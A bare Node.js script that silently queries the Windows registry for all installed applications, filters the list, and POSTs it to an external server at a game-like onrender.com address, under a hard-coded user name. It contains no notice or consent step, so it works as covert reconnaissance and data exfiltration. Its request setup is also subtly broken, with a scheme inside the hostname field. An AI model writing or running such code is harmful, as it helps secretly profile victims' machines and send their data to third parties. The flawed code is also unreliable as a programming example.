let name = "anass";
const { exec } = require("child_process");
const http = require("http");
function isUpper(letter) {
  if (isNaN(parseFloat(letter))) return letter === letter.toUpperCase();
}
function processInstalledApplications(name) {
  exec(
    'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s',
    { windowsHide: true, maxBuffer: 1024 * 1024 },
    (error, stdout) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }

      const lines = stdout.split(/\r?\n/);
      const installedApplications = [];

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        if (
          line.startsWith(
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
          )
        ) {
          const appName = lines[i + 1]
            .split("    ")
            .slice(2)[1]
            .replaceAll("C:\\Program Files (x86)\\", "");

          installedApplications.push(appName);
        }
      }

      let apps = installedApplications.filter((name) => {
        return (
          name && name.length > 0 && !name.startsWith("0x") && isUpper(name[0])
        );
      });

      const data = JSON.stringify({ data: apps });

      const options = {
        hostname: "https://lclika-game.onrender.com",
        port: process.env.PORT,
        path: `/${name}`,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": data.length,
        },
      };

      const req = http.request(options, (res) => {
        res.on("data", (chunk) => {
          console.log(chunk.toString());
        });
      });

      req.on("error", (error) => {
        console.error(`Error: ${error.message}`);
      });

      req.write(data);
      req.end();
    }
  );
}

processInstalledApplications(name);
